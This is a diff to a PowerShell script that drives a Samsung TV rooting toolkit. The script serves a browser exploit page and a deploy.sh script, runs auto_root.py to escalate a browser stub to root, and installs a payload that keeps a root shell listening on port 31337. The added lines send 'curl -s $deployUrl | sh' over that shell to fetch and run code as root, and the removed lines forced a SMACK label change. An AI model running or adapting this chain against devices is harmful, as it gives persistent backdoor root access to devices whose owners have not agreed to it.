@@ -11,11 +11,17 @@
   The script expects tools/ and server/ beside it (or -ToolkitDir). If port 80
   is already served by a different server, pass -RestartServer to replace it.
 
+  deploy.sh is a template that server.py renders per request (H= is the address
+  the TV fetched it from; WANT=/SIZE_WANT= are the payload.dll hash/size). There
+  is no generated deploy_local.sh any more: a stale copy of it gated the wrong
+  payload build and broke both deploy and recover.
+
 .PARAMETER TvIp
   TV address (or set ROOT_TV).
 
 .PARAMETER HostIp
-  PC address as seen by the TV. Auto-detected from the TV's subnet if omitted.
+  PC address as seen by the TV. Auto-detected from the route to the TV if
+  omitted (never guessed from "first non-loopback", which can be a VPN adapter).
 
 .PARAMETER ToolkitDir
   Directory containing tools/ and server/.
@@ -74,8 +80,18 @@ function Find-Layout {
 
 function Find-Python {
     param([string]$Explicit)
-    if ($Explicit) { return (Resolve-Path -LiteralPath $Explicit).Path }
-    if ($env:ROOT_PYTHON) { return $env:ROOT_PYTHON }
+    if ($Explicit) {
+        if (Test-Path -LiteralPath $Explicit) { return (Resolve-Path -LiteralPath $Explicit).Path }
+        $c = Get-Command $Explicit -ErrorAction SilentlyContinue
+        if ($c) { return $c.Source }
+        throw "-Python '$Explicit' is neither a path nor a command on PATH."
+    }
+    if ($env:ROOT_PYTHON) {
+        if (Test-Path -LiteralPath $env:ROOT_PYTHON) { return $env:ROOT_PYTHON }
+        $c = Get-Command $env:ROOT_PYTHON -ErrorAction SilentlyContinue
+        if ($c) { return $c.Source }
+        throw "ROOT_PYTHON='$($env:ROOT_PYTHON)' does not resolve."
+    }
     $cmd = Get-Command pysrv.exe -ErrorAction SilentlyContinue
     if ($cmd) { return $cmd.Source }
     $base = Join-Path $env:LOCALAPPDATA "Python"
@@ -90,15 +106,24 @@ function Find-Python {
 }
 
 function Get-LocalAddressFor {
+    # Ask the routing table which local address would reach the TV.  The old
+    # heuristic (first address with the TV's /24, else first non-loopback) could
+    # return a VPN/Wi-Fi adapter, and the TV then fetched from an unreachable
+    # address with no error (review finding M5, 2026-10-26).
     param([string]$Tv)
-    $prefix = (($Tv -split '\.')[0..2]) -join '.'
+    try {
+        $route = Find-NetRoute -RemoteIPAddress $Tv -ErrorAction Stop |
+                 Where-Object { $_.IPAddress } | Select-Object -First 1
+        if ($route -and $route.IPAddress -and $route.IPAddress -notlike '127.*') {
+            return $route.IPAddress
+        }
+    } catch { }
     $ip = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
-          Where-Object { $_.IPAddress -like "$prefix.*" -and $_.IPAddress -ne $Tv } |
+          Where-Object { $_.AddressState -eq 'Preferred' -and $_.IPAddress -notlike '127.*' -and
+                         $_.IPAddress -notlike '169.254.*' } |
           Select-Object -First 1 -ExpandProperty IPAddress
     if ($ip) { return $ip }
-    return (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
-            Where-Object { $_.IPAddress -notlike '127.*' } |
-            Select-Object -First 1 -ExpandProperty IPAddress)
+    throw "Could not determine this PC's address on the TV's network; pass -HostIp <ipv4>."
 }
 
 function Test-TvPort {
@@ -112,10 +137,7 @@ function Test-TvPort {
     try {
         $r = $c.BeginConnect($Tv, $Port, $null, $null)
         if (-not $r.AsyncWaitHandle.WaitOne(1500)) {
-            # cancel the pending connect so it cannot complete against a
-            # disposed client on a threadpool thread
-            try { [Net.Sockets.Socket]::CancelConnectAsync($r) } catch { }
-            return $false
+            return $false   # Close() in finally cancels the pending connect
         }
         $c.EndConnect($r)
         return $true
@@ -123,8 +145,11 @@ function Test-TvPort {
 }
 
 function Test-LocalListen {
-    param([int]$Port)
-    return [bool](Get-NetTCPConnection -LocalPort $Port -State Listen -ErrorAction SilentlyContinue)
+    param([int]$Port, [switch]$LoopbackOnly)
+    $conns = Get-NetTCPConnection -LocalPort $Port -State Listen -ErrorAction SilentlyContinue
+    if (-not $conns) { return $false }
+    if ($LoopbackOnly) { return ($conns | Where-Object { $_.LocalAddress -eq '127.0.0.1' }).Count -gt 0 }
+    return ($conns | Where-Object { $_.LocalAddress -notlike '127.*' }).Count -gt 0
 }
 
 function Test-Page {
@@ -139,10 +164,10 @@ function Test-OwnServer {
     # Prove the server on :80 serves *this* directory, not some other copy.
     param([string]$ServerDir)
     $nonce = [guid]::NewGuid().ToString("N")
-    $probe = Join-Path $ServerDir ".root_probe"
+    $probe = Join-Path $ServerDir (".root_probe_" + $nonce)
     try {
         Set-Content -LiteralPath $probe -Value $nonce -Encoding ascii -NoNewline
-        $r = Invoke-WebRequest -Uri "http://127.0.0.1/.root_probe" -UseBasicParsing -TimeoutSec 3
+        $r = Invoke-WebRequest -Uri "http://127.0.0.1/$([IO.Path]::GetFileName($probe))" -UseBasicParsing -TimeoutSec 3
         $body = if ($r.Content -is [byte[]]) { [Text.Encoding]::UTF8.GetString($r.Content) } else { [string]$r.Content }
         return ($body.Trim() -eq $nonce)
     } catch { return $false }
@@ -173,22 +198,36 @@ function Start-ToolkitServer {
         -RedirectStandardOutput $out -RedirectStandardError $err -PassThru -WindowStyle Hidden
     $deadline = (Get-Date).AddSeconds(10)
     while (-not (Test-LocalListen -Port 80)) {
-        if ((Get-Date) -gt $deadline) { throw "server did not bind :80 (see $err)" }
+        if ((Get-Date) -gt $deadline) {
+            Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue
+            throw "server did not bind :80 (see $err)"
+        }
         Start-Sleep -Milliseconds 250
     }
     Say "server  : pid $($p.Id) listening on :80"
 }
 
 if (-not $TvIp) { throw "Pass -TvIp <tv-ip> (or set ROOT_TV)." }
+$TvParsed = $null
+if (-not [Net.IPAddress]::TryParse($TvIp, [ref]$TvParsed)) {
+    throw "-TvIp '$TvIp' is not an IPv4 address (the payload's allowlist compares IPs)."
+}
 
 $layout = Find-Layout -Hint $ToolkitDir
 $py = Find-Python -Explicit $Python
-if (-not $HostIp) { $HostIp = Get-LocalAddressFor -Tv $TvIp }
+if ($HostIp) {
+    $HostParsed = $null
+    if (-not [Net.IPAddress]::TryParse($HostIp, [ref]$HostParsed)) {
+        throw "-HostIp '$HostIp' is not an IPv4 address."
+    }
+} else {
+    $HostIp = Get-LocalAddressFor -Tv $TvIp
+}
 
 $url = "http://$HostIp/$Page"
-$deployLocal = Join-Path $layout.ServerDir "deploy_local.sh"
+$deployUrl = "http://$HostIp/deploy.sh"
 $serverUp = Test-LocalListen -Port 80
-$serverOurs = if ($serverUp) { Test-OwnServer -ServerDir $layout.ServerDir } else { $false }
+$serverOurs = if ($serverUp -and -not $DryRun) { Test-OwnServer -ServerDir $layout.ServerDir } else { $false }
 $pageOk = if ($serverOurs) { Test-Page -Name $Page } else { $false }
 $tvRooted = Test-TvPort -Tv $TvIp -Port 31337
 
@@ -198,6 +237,7 @@ Say "python  : $py"
 Say "TV      : $TvIp"
 Say "host    : $HostIp"
 Say "page    : $url"
+Say "deploy  : $deployUrl (rendered by server.py)"
 if ($DryRun) { Say "mode    : DRY RUN" }
 Say "==========================================================="
 
@@ -213,9 +253,14 @@ if ($DryRun) {
         Say "server on :80 : a DIFFERENT server (would need -RestartServer)"
     }
     Say "31337 on TV   : $(if ($tvRooted) { 'open (TV looks rooted)' } else { 'closed' })"
-    Say "would write   : $deployLocal"
-    Say "would run     : $py $($layout.Tools)\auto_root.py --host $HostIp --script deploy_local.sh --stub-wait $StubWaitSec --root-retries 3"
-    Say "then wait     : 31337 for up to $BootTimeoutSec s after the reboot"
+    if ($tvRooted -and -not $Force) {
+        Say "would        : stop (already rooted; pass -Force to redeploy over 31337)"
+    } elseif ($tvRooted) {
+        Say "would run     : $py $($layout.Tools)\root_shell.py `"curl -s $deployUrl | sh`" $TvIp"
+    } else {
+        Say "would run     : $py $($layout.Tools)\auto_root.py --host $HostIp --script deploy.sh --stub-wait $StubWaitSec --root-retries 3"
+        Say "then wait     : 31337 for up to $BootTimeoutSec s after the reboot"
+    }
     exit 0
 }
 
@@ -238,7 +283,7 @@ if (-not $tvRooted) {
 if ($tvRooted -and -not $Force) {
     Say ""
     Say "Port 31337 is already open - this TV is rooted."
-    Say "Use -Force to check/redeploy anyway (you will need the TV remote to load the page)."
+    Say "Use -Force to check/redeploy anyway (no page load needed: the deploy goes over 31337)."
     exit 0
 }
 
@@ -258,34 +303,42 @@ if ($NoServer) {
 }
 
 if (-not (Test-Page -Name $Page)) { throw "server is not serving /$Page after start" }
-
-$text = Get-Content -LiteralPath $layout.Deploy -Raw
-$text = [regex]::Replace($text, '(?m)^H=.*$', "H=http://$HostIp")
-$text = $text -replace "`r`n", "`n"
-
-# The stub runs as uid 5001 with the BROWSER's SMACK label, and that label cannot
-# write the app's bin/ - only the app's own label can (docs/FAILED.md). By the time
-# this script runs, auto_root.py has already patched the stub's cred to uid 0 with
-# full caps, so the shell it forks is root and CAN take the app's label. Inject
-# that here, otherwise the deploy ends in COPY=fail.
-$prelude = @'
-# --- injected by root.ps1: take the app's label so bin/ is writable ------------
-_APPID_LABEL=User::Pkg::com.samsung.tv.MultiControl-Service
-echo -n "$_APPID_LABEL" > /proc/self/attr/current 2>/dev/null
-if [ "$(cat /proc/self/attr/current 2>/dev/null)" = "$_APPID_LABEL" ]; then
-  echo RELABEL=ok
-else
-  echo "RELABEL=fail uid=$(id -u) - the deploy below will fail; use server/recover.sh from a root shell"
-fi
-# ------------------------------------------------------------------------------
-'@
-$prelude = $prelude -replace "`r`n", "`n"
-if ($text -match '(?s)^(#!/[^\n]*\n)') {
-    $text = $Matches[1] + $prelude + "`n" + $text.Substring($Matches[1].Length)
-} else {
-    $text = $prelude + "`n" + $text
+foreach ($f in "deploy.sh", "payload.dll") {
+    if (-not (Test-Page -Name $f)) { throw "server is not serving /$f after start" }
 }
-[IO.File]::WriteAllText($deployLocal, $text, [Text.Encoding]::ASCII)
+
+if ($tvRooted -and $Force) {
+    # Already rooted: deploy over the 31337 channel.  This needs no page load and
+    # no stub, and avoids the trap where a payload still hunting for root holds
+    # /dev/video40 and the browser stub cannot open it.
+    Say ""
+    Say "1) Redeploying over the existing root channel (31337)..."
+    $cmd = "curl -s $deployUrl | sh"
+    # deploy.sh can take longer than the 30 s default reply timeout (it sleeps
+    # before restarting the app); the payload's own Run() cap is 120 s.
+    $env:ROOT_SHELL_TIMEOUT = "180"
+    $out = & $py (Join-Path $layout.Tools "root_shell.py") $cmd $TvIp | Out-String
+    Write-Host $out
+    if ($LASTEXITCODE -ne 0 -or $out -notmatch "DEPLOY_DONE" -or $out -notmatch "COPY=ok") {
+        Say "Redeploy over 31337 failed (exit $LASTEXITCODE)."
+        Say "Reload $url and run again, or use server/recover.sh from a root shell."
+        exit 1
+    }
+    Say ""
+    Say "2) Deploy verified. The deploy restarts the app, so 31337 can be down for ~10 s."
+    if (-not $NoWait) {
+        $deadline = (Get-Date).AddSeconds($BootTimeoutSec)
+        while ((Get-Date) -lt $deadline -and -not (Test-TvPort -Tv $TvIp -Port 31337)) {
+            Start-Sleep -Seconds 2
+        }
+        if (-not (Test-TvPort -Tv $TvIp -Port 31337)) {
+            Say "31337 did not come back within $BootTimeoutSec s - check beacons.log."
+            exit 1
+        }
+        Say "31337 is back; payload active."
+    }
+    exit 0
+}
 
 Say ""
 Say "1) ON THE TV, with its remote, open this URL:"
@@ -298,7 +351,7 @@ Say "   and will remind you every 30 s if the page has not connected."
 Say "   If a stub dies during root, it will ask you to RELOAD the page once"
 Say "   and then continues automatically (up to 3 fresh stubs)."
 Say ""
-& $py (Join-Path $layout.Tools "auto_root.py") --host $HostIp --script "deploy_local.sh" `
+& $py (Join-Path $layout.Tools "auto_root.py") --host $HostIp --script "deploy.sh" `
     --wait 150 --stub-wait $StubWaitSec --page $Page --heartbeat 30 --root-retries 3
 if ($LASTEXITCODE -ne 0) {
     Say ""
